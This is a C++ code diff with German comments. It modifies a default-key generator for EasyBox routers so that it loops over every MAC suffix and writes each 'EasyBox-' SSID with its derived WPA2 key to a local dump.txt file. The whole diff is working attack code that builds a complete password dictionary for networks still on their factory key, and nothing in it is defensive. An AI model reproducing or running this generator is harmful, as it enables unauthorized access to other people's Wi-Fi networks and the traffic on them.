@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <iomanip>
+#include <fstream>
 
 int main()
 {
@@ -10,16 +11,19 @@ int main()
 	i = 0x00;
 	j = 0x00;
 	k = 0x00;
-
+    
+    std::ofstream dump;
+            dump.open("/Users/SimpleJack/Documents/easybox/easybox/dump.txt");
+    
 	do {
         
 		do {
             
 			do {
                 
-				std::cout << std::hex << i << ":" << std::setfill ('0') << std::setw (2);
-                std::cout << std::hex << j << ":" << std::setfill ('0') << std::setw (2);
-                std::cout << std::hex << k << "\n" << std::setfill ('0') << std::setw (2);
+				// std::cout << std::hex << i << ":" << std::setfill ('0') << std::setw (2);
+                // std::cout << std::hex << j << ":" << std::setfill ('0') << std::setw (2);
+                // std::cout << std::hex << k << "\n" << std::setfill ('0') << std::setw (2);
                 
                 // Hier muss nun der KeyGen eingefügt werden, welcher für jeden durchgang einen Key erstellt.       # UPDATE: Done.
                 // Außerdem muss sein Output (*) nicht als printf enden, sondern entweder in einer Textdatei Zeile
@@ -29,7 +33,7 @@ int main()
                 //int orig()
                 {
                     
-                    //Code von originalem Keygen
+                    // Code von originalem Keygen
                     // By Sebastian Petters
                     // http://www.wotan.cc
                     unsigned  int mac_4, mac_5, mac_6;
@@ -51,7 +55,7 @@ int main()
                     sprintf(last4, "%1X%1X%1X%1X", m9, m10, m11, m12);
                     int smac;
                     sscanf(last4, "%X", &smac);
-                    printf("\nSMAC: %i", smac);     //Output ändern (*)
+                    //printf("\nSMAC: %i", smac);     //Output ändern (*) // Unwichtig
                     
                     char smacs[5];
                     sprintf(smacs, "%05d", smac);
@@ -61,13 +65,13 @@ int main()
                     s8 = smacs[2] - '0';
                     s9 = smacs[3] - '0';
                     s10 = smacs[4] - '0';
-                    printf("\nSSID: EasyBox-%1X%1X%1X%1X%1X%1X",m7, m8, m9, m10, s6, s10);      //Output ändern (*)
+                    // printf("EasyBox-%1X%1X%1X%1X%1X%1X",m7, m8, m9, m10, s6, s10);      //Output ändern (*)
                     
                     int k1, k2;
                     k1 = (s7 + s8 + m11 + m12) & 0x0f;
                     k2 = (m9 + m10 +s9 + s10) & 0x0f;
-                    printf("\nK1: %1X", k1);        //Output ändern(*)
-                    printf("\nK2: %1X", k2);        //Output ändern (*)
+                    //printf("\nK1: %1X", k1);        //Output ändern(*) // Unwichtig
+                    //printf("\nK2: %1X", k2);        //Output ändern (*) // Unwichtig
                     
                     int x1, x2, x3, y1, y2, y3, z1, z2, z3;
                     x1 = k1 ^ s10;
@@ -80,8 +84,15 @@ int main()
                     z2 = m12 ^ s9;
                     z3 = k1 ^ k2;
                     
-                    printf("\nWPA2-Key: %1X%1X%1X%1X%1X%1X%1X%1X%1X\n\n\n\n", x1, y1, z1, x2, y2, z2, x3, y3, z3);        //Output ändern (*)
+                    // printf(" %1X%1X%1X%1X%1X%1X%1X%1X%1X\n", x1, y1, z1, x2, y2, z2, x3, y3, z3);        //Output ändern (*)
                  
+                    
+                    //now output as file
+                    
+                    
+                    
+                    dump << "EasyBox-" << m7 << m8 << m9 << m10 << s6 << s10 << " " << std::uppercase << std::hex << x1 << std::hex << y1 << std::hex << z1 << std::hex << x2 << std::hex << y2 << std::hex << z2 << std::hex << x3 << std::hex << y3 << std::hex << z3 << "\n";
+                    
                     //return 0;
                 };
                 
@@ -96,6 +107,6 @@ int main()
         i++;
         j = 0x00;
     } while(i<=0xFF);
-    
+    dump.close();
     return 0;
 }
